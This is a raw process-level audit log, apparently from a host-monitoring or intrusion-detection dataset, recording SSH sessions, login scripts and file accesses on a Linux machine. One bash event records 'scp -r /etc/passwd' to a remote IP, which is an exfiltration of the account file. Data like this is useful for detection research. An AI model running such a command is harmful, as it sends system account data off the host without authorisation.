1557892318.243:1508880499,823D1C56-F86D-0D14-C946-1C6CF7BAFA5B:sshd,EXECUTE,25E8E54C-76EB-F8B0-B609-6EC2CE0AAD56,sshd,null
1557892318.243:1508880478,3E8119A1-F9B4-0931-53D3-3FF11EEA5228:sshd,FORK,823D1C56-F86D-0D14-C946-1C6CF7BAFA5B,sshd,null
1557892294.555:1508838636,A4584FAB-5302-67C8-AED4-8C85C3FA3310:xscreensaver,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557892294.555:1508838607,A4584FAB-5302-67C8-AED4-8C85C3FA3310:xscreensaver,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557892294.547:1508838578,A4584FAB-5302-67C8-AED4-8C85C3FA3310:xscreensaver,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557892266.067:1508785588,4834CEEB-529E-6665-EF9E-26E63861BC8D:pkexec,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557892266.067:1508785585,4834CEEB-529E-6665-EF9E-26E63861BC8D:pkexec,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557892266.063:1508785354,C57AD54C-3FC8-48BC-7FBD-30F7BEFE1AD8:update-notifier,EXECUTE,4834CEEB-529E-6665-EF9E-26E63861BC8D,pkexec,null
1557892266.063:1508785354,8F7EFDDE-B626-5E1F-A791-3B8DDB7EE42B:update-notifier,CHANGE_PRINCIPAL,C57AD54C-3FC8-48BC-7FBD-30F7BEFE1AD8,update-notifier,null
1557892266.039:1508785295,08A098AE-EDDB-CB2C-BFE0-51C28F8D549A:update-notifier,FORK,8F7EFDDE-B626-5E1F-A791-3B8DDB7EE42B,update-notifier,null
1557892029.110:1508341742,9ADE0C85-5BFF-34EE-ED2F-CE6651B371E8:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557892029.110:1508341628,9ADE0C85-5BFF-34EE-ED2F-CE6651B371E8:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557892029.110:1508341528,B7FA0EC1-64BF-10BF-3261-411FAA26B0D1:sshd,CHANGE_PRINCIPAL,9ADE0C85-5BFF-34EE-ED2F-CE6651B371E8,sshd,null
1557892029.110:1508341527,B7FA0EC1-64BF-10BF-3261-411FAA26B0D1:sshd,CHANGE_PRINCIPAL,B7FA0EC1-64BF-10BF-3261-411FAA26B0D1,sshd,null
1557892029.110:1508341526,9ADE0C85-5BFF-34EE-ED2F-CE6651B371E8:sshd,CHANGE_PRINCIPAL,B7FA0EC1-64BF-10BF-3261-411FAA26B0D1,sshd,null
1557892025.662:1508332160,ED8547F7-AFBC-B0D7-8C4B-7BA07B3B4E2E:ssh,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557892025.662:1508332157,ED8547F7-AFBC-B0D7-8C4B-7BA07B3B4E2E:ssh,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557892025.662:1508332154,ED8547F7-AFBC-B0D7-8C4B-7BA07B3B4E2E:ssh,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557892025.662:1508332151,ED8547F7-AFBC-B0D7-8C4B-7BA07B3B4E2E:ssh,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557892025.662:1508332148,ED8547F7-AFBC-B0D7-8C4B-7BA07B3B4E2E:ssh,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557892025.662:1508332145,ED8547F7-AFBC-B0D7-8C4B-7BA07B3B4E2E:ssh,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557892025.662:1508332142,ED8547F7-AFBC-B0D7-8C4B-7BA07B3B4E2E:ssh,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557892025.654:1508332109,ED8547F7-AFBC-B0D7-8C4B-7BA07B3B4E2E:ssh,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557892025.650:1508332005,BB4C7182-F376-DA81-9C98-C217B58D3104:scp,EXECUTE,ED8547F7-AFBC-B0D7-8C4B-7BA07B3B4E2E,ssh,null
1557892025.650:1508331996,C4E19CB5-1A95-7A35-BE40-B0BE00272456:scp,FORK,BB4C7182-F376-DA81-9C98-C217B58D3104,scp,null
1557892025.650:1508331989,C4E19CB5-1A95-7A35-BE40-B0BE00272456:scp,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557892025.650:1508331928,0726C675-85E7-FF6F-4388-0B8936BB8046:bash,EXECUTE,C4E19CB5-1A95-7A35-BE40-B0BE00272456,b'scp -r /etc/passwd admin@128.55.12.106:./work/',null
1557892025.650:1508331922,06F84CCB-5560-3DFE-AAA8-81AE9FC83B7C:bash,FORK,0726C675-85E7-FF6F-4388-0B8936BB8046,bash,null
1557892025.470:1508328781,06F84CCB-5560-3DFE-AAA8-81AE9FC83B7C:bash,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557892025.466:1508328695,FCCCC5B6-0D47-8065-0727-C6D3EB321E3D:sshd,EXECUTE,06F84CCB-5560-3DFE-AAA8-81AE9FC83B7C,bash,null
1557892025.466:1508328591,C3013022-35E0-67D3-65E1-F0902DAED667:sshd,FORK,FCCCC5B6-0D47-8065-0727-C6D3EB321E3D,sshd,null
1557892025.466:1508328544,9ADE0C85-5BFF-34EE-ED2F-CE6651B371E8:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557892025.466:1508328538,9ADE0C85-5BFF-34EE-ED2F-CE6651B371E8:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557892025.466:1508328518,BA5AF3EA-D08C-19E4-C31F-CF613A5942ED:sshd,CHANGE_PRINCIPAL,C3013022-35E0-67D3-65E1-F0902DAED667,sshd,null
1557892025.466:1508328496,4D638E8F-4579-C233-F277-839930878D69:sshd,CHANGE_PRINCIPAL,BA5AF3EA-D08C-19E4-C31F-CF613A5942ED,sshd,null
1557892025.466:1508328493,9ADE0C85-5BFF-34EE-ED2F-CE6651B371E8:sshd,FORK,4D638E8F-4579-C233-F277-839930878D69,sshd,null
1557892025.466:1508328484,9ADE0C85-5BFF-34EE-ED2F-CE6651B371E8:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557892025.466:1508328448,9ADE0C85-5BFF-34EE-ED2F-CE6651B371E8:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557892025.466:1508328445,9ADE0C85-5BFF-34EE-ED2F-CE6651B371E8:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557892025.466:1508328442,9ADE0C85-5BFF-34EE-ED2F-CE6651B371E8:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557892025.418:1508326293,F35EE04C-FAA9-64DD-2B62-71C5BF3A4FFE:lsb_release,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557892025.406:1508326050,9E5A0607-40FA-2861-33A4-400E2496925E:91-release-upgr,EXECUTE,F35EE04C-FAA9-64DD-2B62-71C5BF3A4FFE,lsb_release,null
1557892025.406:1508326024,18F8D123-4AA7-DAD1-F58D-3304A60EF672:91-release-upgr,FORK,9E5A0607-40FA-2861-33A4-400E2496925E,91-release-upgr,null
1557892025.406:1508326017,243EC608-4A7D-705D-9737-2A1CEA262B32:91-release-upgr,FORK,18F8D123-4AA7-DAD1-F58D-3304A60EF672,91-release-upgr,null
1557892025.406:1508325995,00049D33-8C2A-B7F6-7F05-4DEF7BC5E179:run-parts,EXECUTE,243EC608-4A7D-705D-9737-2A1CEA262B32,91-release-upgr,null
1557892025.406:1508325994,C0C8D3AD-5087-B97B-B096-A7CE1E16A8FC:run-parts,FORK,00049D33-8C2A-B7F6-7F05-4DEF7BC5E179,run-parts,null
1557892025.266:1508317664,D0115CB5-9DCB-532C-E42D-4A0914E5B719:landscape-sysin,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557892025.258:1508317238,DAC7428E-4C46-23D6-FF33-74F7BC3FA9FD:50-landscape-sy,EXECUTE,D0115CB5-9DCB-532C-E42D-4A0914E5B719,landscape-sysin,null
1557892025.258:1508317234,0093D645-4AFB-36D2-876B-E2EEAACC1B21:50-landscape-sy,FORK,DAC7428E-4C46-23D6-FF33-74F7BC3FA9FD,50-landscape-sy,null
1557892025.254:1508316973,BF8A8B76-C435-EFF9-F4BC-D920D3EC56A8:run-parts,EXECUTE,0093D645-4AFB-36D2-876B-E2EEAACC1B21,50-landscape-sy,null
1557892025.254:1508316972,C0C8D3AD-5087-B97B-B096-A7CE1E16A8FC:run-parts,FORK,BF8A8B76-C435-EFF9-F4BC-D920D3EC56A8,run-parts,null
1557892025.246:1508316619,417277CC-1F61-ECB4-A3EA-5BB710ADF9FB:env,EXECUTE,C0C8D3AD-5087-B97B-B096-A7CE1E16A8FC,run-parts,null
1557892025.242:1508316598,844BE8B0-4DCE-9979-586C-6723F9C9B2C0:sh,EXECUTE,417277CC-1F61-ECB4-A3EA-5BB710ADF9FB,env,null
1557892025.242:1508316591,BC284027-59C3-D2A8-38C5-704A85E070B7:sh,FORK,844BE8B0-4DCE-9979-586C-6723F9C9B2C0,sh,null
1557892025.242:1508316532,3E2A2913-F8ED-737D-4AB6-B61B10B82508:sshd,EXECUTE,BC284027-59C3-D2A8-38C5-704A85E070B7,sh,null
1557892025.242:1508316484,9ADE0C85-5BFF-34EE-ED2F-CE6651B371E8:sshd,FORK,3E2A2913-F8ED-737D-4AB6-B61B10B82508,sshd,null
1557892025.242:1508316459,9ADE0C85-5BFF-34EE-ED2F-CE6651B371E8:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557892025.218:1508316055,9ADE0C85-5BFF-34EE-ED2F-CE6651B371E8:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557892025.218:1508316004,9ADE0C85-5BFF-34EE-ED2F-CE6651B371E8:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557892025.218:1508315992,F94AE7E7-AE8E-B594-D98C-2042156F205D:sshd,CHANGE_PRINCIPAL,9ADE0C85-5BFF-34EE-ED2F-CE6651B371E8,sshd,null
1557892025.218:1508315991,05D8027B-8748-E173-65CD-D8D95350C53E:sshd,CHANGE_PRINCIPAL,F94AE7E7-AE8E-B594-D98C-2042156F205D,sshd,null
1557892025.218:1508315990,F94AE7E7-AE8E-B594-D98C-2042156F205D:sshd,CHANGE_PRINCIPAL,05D8027B-8748-E173-65CD-D8D95350C53E,sshd,null
1557892025.218:1508315989,9ADE0C85-5BFF-34EE-ED2F-CE6651B371E8:sshd,CHANGE_PRINCIPAL,F94AE7E7-AE8E-B594-D98C-2042156F205D,sshd,null
1557892025.218:1508315987,9ADE0C85-5BFF-34EE-ED2F-CE6651B371E8:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557892025.218:1508315973,9ADE0C85-5BFF-34EE-ED2F-CE6651B371E8:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557892025.214:1508315933,9ADE0C85-5BFF-34EE-ED2F-CE6651B371E8:sshd,MMAP,6C077190-DBB6-664D-8280-B3D04B5DC371,/etc/shadow,null
1557892025.214:1508315930,9ADE0C85-5BFF-34EE-ED2F-CE6651B371E8:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557892025.202:1508315884,9ADE0C85-5BFF-34EE-ED2F-CE6651B371E8:sshd,MMAP,6C077190-DBB6-664D-8280-B3D04B5DC371,/etc/shadow,null
1557892025.202:1508315881,9ADE0C85-5BFF-34EE-ED2F-CE6651B371E8:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557892025.098:1508315477,9ADE0C85-5BFF-34EE-ED2F-CE6651B371E8:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557892025.098:1508315445,9ADE0C85-5BFF-34EE-ED2F-CE6651B371E8:sshd,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
1557892025.098:1508315444,9ADE0C85-5BFF-34EE-ED2F-CE6651B371E8:sshd,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
1557892025.006:1508315074,9ADE0C85-5BFF-34EE-ED2F-CE6651B371E8:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557892025.002:1508314818,77A472DF-53F9-55A6-6176-9B27279F833A:sshd,EXECUTE,9ADE0C85-5BFF-34EE-ED2F-CE6651B371E8,sshd,null
1557892024.998:1508314797,3E8119A1-F9B4-0931-53D3-3FF11EEA5228:sshd,FORK,77A472DF-53F9-55A6-6176-9B27279F833A,sshd,null
1557891910.817:1508082627,44DE2784-52D6-420D-3835-C63C1E5CF5B6:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557891910.817:1508082546,44DE2784-52D6-420D-3835-C63C1E5CF5B6:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557891910.813:1508082465,A2E8D47F-B61F-7AE3-78CE-2091A2B378D0:sshd,CHANGE_PRINCIPAL,44DE2784-52D6-420D-3835-C63C1E5CF5B6,sshd,null
1557891910.813:1508082464,A2E8D47F-B61F-7AE3-78CE-2091A2B378D0:sshd,CHANGE_PRINCIPAL,A2E8D47F-B61F-7AE3-78CE-2091A2B378D0,sshd,null
1557891910.813:1508082463,44DE2784-52D6-420D-3835-C63C1E5CF5B6:sshd,CHANGE_PRINCIPAL,A2E8D47F-B61F-7AE3-78CE-2091A2B378D0,sshd,null
1557891898.097:1507627736,E683947E-380A-46F4-78ED-9D56EA081968:bash,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557891898.093:1507627641,C8DB433A-C998-5B1B-0BC6-C595C975F77E:sshd,EXECUTE,E683947E-380A-46F4-78ED-9D56EA081968,bash,null
1557891898.093:1507627517,61CB1C2D-7B1F-A1B7-04D3-FDB694601543:sshd,FORK,C8DB433A-C998-5B1B-0BC6-C595C975F77E,sshd,null
1557891898.093:1507627470,44DE2784-52D6-420D-3835-C63C1E5CF5B6:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557891898.093:1507627464,44DE2784-52D6-420D-3835-C63C1E5CF5B6:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557891898.093:1507627444,91E15FCE-E347-D85E-0184-F95740DFE3F1:sshd,CHANGE_PRINCIPAL,61CB1C2D-7B1F-A1B7-04D3-FDB694601543,sshd,null
1557891898.093:1507627422,8104BC34-945E-8339-7069-8093E2A64CA0:sshd,CHANGE_PRINCIPAL,91E15FCE-E347-D85E-0184-F95740DFE3F1,sshd,null
1557891898.093:1507627419,44DE2784-52D6-420D-3835-C63C1E5CF5B6:sshd,FORK,8104BC34-945E-8339-7069-8093E2A64CA0,sshd,null
1557891898.093:1507627410,44DE2784-52D6-420D-3835-C63C1E5CF5B6:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557891898.089:1507627374,44DE2784-52D6-420D-3835-C63C1E5CF5B6:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557891898.089:1507627371,44DE2784-52D6-420D-3835-C63C1E5CF5B6:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557891898.089:1507627368,44DE2784-52D6-420D-3835-C63C1E5CF5B6:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557891898.045:1507625224,CED4E8F3-4774-7451-0320-6B2AA02EE4DA:lsb_release,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557891898.033:1507624965,3047BE8F-C09E-3E63-732E-90974ABAC088:91-release-upgr,EXECUTE,CED4E8F3-4774-7451-0320-6B2AA02EE4DA,lsb_release,null
1557891898.033:1507624956,C074E6A2-ACCB-BA53-F0C1-69F4C4A8E3DA:91-release-upgr,FORK,3047BE8F-C09E-3E63-732E-90974ABAC088,91-release-upgr,null
1557891898.033:1507624949,FCB70D97-2B22-C1BC-A023-F7252E81E155:91-release-upgr,FORK,C074E6A2-ACCB-BA53-F0C1-69F4C4A8E3DA,91-release-upgr,null
1557891898.033:1507624927,E50D67CB-F2A9-9F13-0731-2B2F5DBE834E:run-parts,EXECUTE,FCB70D97-2B22-C1BC-A023-F7252E81E155,91-release-upgr,null
1557891898.033:1507624926,1273A96E-723E-2AB1-D9A7-BD289303F864:run-parts,FORK,E50D67CB-F2A9-9F13-0731-2B2F5DBE834E,run-parts,null
1557891897.889:1507616630,46A8C26B-E862-6E82-CCD3-8AF54A3BF58E:landscape-sysin,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557891897.885:1507616229,E978DCFF-05C6-A761-8BB4-88EF8B67662E:50-landscape-sy,EXECUTE,46A8C26B-E862-6E82-CCD3-8AF54A3BF58E,landscape-sysin,null
1557891897.885:1507616224,5A02EB6A-3A68-7F49-E4E3-41A7CA6D1546:50-landscape-sy,FORK,E978DCFF-05C6-A761-8BB4-88EF8B67662E,50-landscape-sy,null
1557891897.881:1507615980,6A1DAAAE-3559-DA90-5E2F-46539F919B71:run-parts,EXECUTE,5A02EB6A-3A68-7F49-E4E3-41A7CA6D1546,50-landscape-sy,null
1557891897.881:1507615976,1273A96E-723E-2AB1-D9A7-BD289303F864:run-parts,FORK,6A1DAAAE-3559-DA90-5E2F-46539F919B71,run-parts,null
1557891897.877:1507615655,8C3C5EB9-7D40-972F-3625-5B37B2FFE06D:env,EXECUTE,1273A96E-723E-2AB1-D9A7-BD289303F864,run-parts,null
1557891897.877:1507615628,D6476F1F-1E59-DD0D-22D2-86555220CE4A:sh,EXECUTE,8C3C5EB9-7D40-972F-3625-5B37B2FFE06D,env,null
1557891897.873:1507615540,C00C51C8-1991-C81F-ACF9-07C8C6164AD0:sh,FORK,D6476F1F-1E59-DD0D-22D2-86555220CE4A,sh,null
1557891897.873:1507615501,5EB92BC9-4E22-9AC9-2349-8EDB0642E4AA:sshd,EXECUTE,C00C51C8-1991-C81F-ACF9-07C8C6164AD0,sh,null
1557891897.873:1507615465,44DE2784-52D6-420D-3835-C63C1E5CF5B6:sshd,FORK,5EB92BC9-4E22-9AC9-2349-8EDB0642E4AA,sshd,null
1557891897.873:1507615431,44DE2784-52D6-420D-3835-C63C1E5CF5B6:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557891897.845:1507615245,44DE2784-52D6-420D-3835-C63C1E5CF5B6:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557891897.841:1507615194,44DE2784-52D6-420D-3835-C63C1E5CF5B6:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557891897.841:1507615182,69E82E89-D8DE-2AE7-03D1-6ECA577D8E07:sshd,CHANGE_PRINCIPAL,44DE2784-52D6-420D-3835-C63C1E5CF5B6,sshd,null
1557891897.841:1507615181,F150FA0C-6DBE-FCD2-7FED-516379A1B7AB:sshd,CHANGE_PRINCIPAL,69E82E89-D8DE-2AE7-03D1-6ECA577D8E07,sshd,null
1557891897.841:1507615180,69E82E89-D8DE-2AE7-03D1-6ECA577D8E07:sshd,CHANGE_PRINCIPAL,F150FA0C-6DBE-FCD2-7FED-516379A1B7AB,sshd,null
1557891897.841:1507615179,44DE2784-52D6-420D-3835-C63C1E5CF5B6:sshd,CHANGE_PRINCIPAL,69E82E89-D8DE-2AE7-03D1-6ECA577D8E07,sshd,null
1557891897.841:1507615177,44DE2784-52D6-420D-3835-C63C1E5CF5B6:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557891897.841:1507615163,44DE2784-52D6-420D-3835-C63C1E5CF5B6:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557891897.841:1507615123,44DE2784-52D6-420D-3835-C63C1E5CF5B6:sshd,MMAP,6C077190-DBB6-664D-8280-B3D04B5DC371,/etc/shadow,null
1557891897.841:1507615120,44DE2784-52D6-420D-3835-C63C1E5CF5B6:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557891897.821:1507615059,44DE2784-52D6-420D-3835-C63C1E5CF5B6:sshd,MMAP,6C077190-DBB6-664D-8280-B3D04B5DC371,/etc/shadow,null
1557891897.821:1507615054,44DE2784-52D6-420D-3835-C63C1E5CF5B6:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557891897.717:1507614678,44DE2784-52D6-420D-3835-C63C1E5CF5B6:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557891897.717:1507614646,44DE2784-52D6-420D-3835-C63C1E5CF5B6:sshd,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
1557891897.717:1507614645,44DE2784-52D6-420D-3835-C63C1E5CF5B6:sshd,READ,ED1F91C8-517C-6835-0835-43FA2A19771C,/etc/hosts,null
1557891897.625:1507614297,44DE2784-52D6-420D-3835-C63C1E5CF5B6:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557891897.621:1507614027,9774D991-A8CE-CDB2-8552-54365D7C308F:sshd,EXECUTE,44DE2784-52D6-420D-3835-C63C1E5CF5B6,sshd,null
1557891897.621:1507614001,3E8119A1-F9B4-0931-53D3-3FF11EEA5228:sshd,FORK,9774D991-A8CE-CDB2-8552-54365D7C308F,sshd,null
1557891741.473:1507334578,097604E0-A71C-ED23-4BDE-C2D9AFB642DF:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557891741.473:1507334503,097604E0-A71C-ED23-4BDE-C2D9AFB642DF:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557891741.469:1507334427,CEAF9C96-BD43-11D4-8FD1-FE5EAF025181:sshd,CHANGE_PRINCIPAL,097604E0-A71C-ED23-4BDE-C2D9AFB642DF,sshd,null
1557891741.469:1507334426,CEAF9C96-BD43-11D4-8FD1-FE5EAF025181:sshd,CHANGE_PRINCIPAL,CEAF9C96-BD43-11D4-8FD1-FE5EAF025181,sshd,null
1557891741.469:1507334425,097604E0-A71C-ED23-4BDE-C2D9AFB642DF:sshd,CHANGE_PRINCIPAL,CEAF9C96-BD43-11D4-8FD1-FE5EAF025181,sshd,null
1557891741.185:1507331094,52E70453-F88E-3230-14CE-BB95B02C6EC5:bash,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557891741.185:1507331008,CF5B59A4-6283-4C46-39FD-A8C5D687586E:sshd,EXECUTE,52E70453-F88E-3230-14CE-BB95B02C6EC5,bash,null
1557891741.185:1507330896,E85FB033-E73E-9320-7E96-08A9E0583087:sshd,FORK,CF5B59A4-6283-4C46-39FD-A8C5D687586E,sshd,null
1557891741.185:1507330849,097604E0-A71C-ED23-4BDE-C2D9AFB642DF:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557891741.185:1507330843,097604E0-A71C-ED23-4BDE-C2D9AFB642DF:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557891741.185:1507330823,CE0ED9D3-24AB-0ADC-70E6-5B33328EA667:sshd,CHANGE_PRINCIPAL,E85FB033-E73E-9320-7E96-08A9E0583087,sshd,null
1557891741.181:1507330801,5B84A683-4419-0EE1-F52B-7C1FE0533895:sshd,CHANGE_PRINCIPAL,CE0ED9D3-24AB-0ADC-70E6-5B33328EA667,sshd,null
1557891741.181:1507330798,097604E0-A71C-ED23-4BDE-C2D9AFB642DF:sshd,FORK,5B84A683-4419-0EE1-F52B-7C1FE0533895,sshd,null
1557891741.181:1507330789,097604E0-A71C-ED23-4BDE-C2D9AFB642DF:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557891741.181:1507330753,097604E0-A71C-ED23-4BDE-C2D9AFB642DF:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557891741.181:1507330750,097604E0-A71C-ED23-4BDE-C2D9AFB642DF:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557891741.181:1507330747,097604E0-A71C-ED23-4BDE-C2D9AFB642DF:sshd,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557891741.133:1507328584,080A6D64-7617-C454-B2BD-EE30A2807B0C:lsb_release,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557891741.121:1507328323,A196FFCF-20C2-56FF-35FA-E8EF9A25AA05:91-release-upgr,EXECUTE,080A6D64-7617-C454-B2BD-EE30A2807B0C,lsb_release,null
1557891741.121:1507328316,ADD4FEF9-8961-B5C2-6021-F4D3E913FCAB:91-release-upgr,FORK,A196FFCF-20C2-56FF-35FA-E8EF9A25AA05,91-release-upgr,null
1557891741.121:1507328309,46E0EFC3-F057-0D2C-4E93-8A31318568E5:91-release-upgr,FORK,ADD4FEF9-8961-B5C2-6021-F4D3E913FCAB,91-release-upgr,null
1557891741.121:1507328287,814859AD-CC1D-7413-0DD0-4A4388F5C3E5:run-parts,EXECUTE,46E0EFC3-F057-0D2C-4E93-8A31318568E5,91-release-upgr,null
1557891741.121:1507328286,23D010B6-A3EE-C4B2-0C83-8CBA1237E8A5:run-parts,FORK,814859AD-CC1D-7413-0DD0-4A4388F5C3E5,run-parts,null
1557891740.969:1507319981,C029BC60-AA89-397D-0BCF-54A5D2AB2889:landscape-sysin,MMAP,70AECC59-9E10-7B1D-AF56-D3C0A8932F51,/etc/passwd,null
1557891740.961:1507319578,9662BE11-BA73-9045-342D-C19534DF929C:50-landscape-sy,EXECUTE,C029BC60-AA89-397D-0BCF-54A5D2AB2889,landscape-sysin,null
1557891740.961:1507319572,BEE14309-C717-3B03-7A48-A5CEF2F5F560:50-landscape-sy,FORK,9662BE11-BA73-9045-342D-C19534DF929C,50-landscape-sy,null
1557891740.957:1507319288,1F062B8C-75E1-4A2B-697D-9A33F228A882:run-parts,EXECUTE,BEE14309-C717-3B03-7A48-A5CEF2F5F560,50-landscape-sy,null
1557891740.957:1507319285,23D010B6-A3EE-C4B2-0C83-8CBA1237E8A5:run-parts,FORK,1F062B8C-75E1-4A2B-697D-9A33F228A882,run-parts,null
1557891740.949:1507318921,5045B872-FBE6-9040-6EF4-58358F60EA19:env,EXECUTE,23D010B6-A3EE-C4B2-0C83-8CBA1237E8A5,run-parts,null
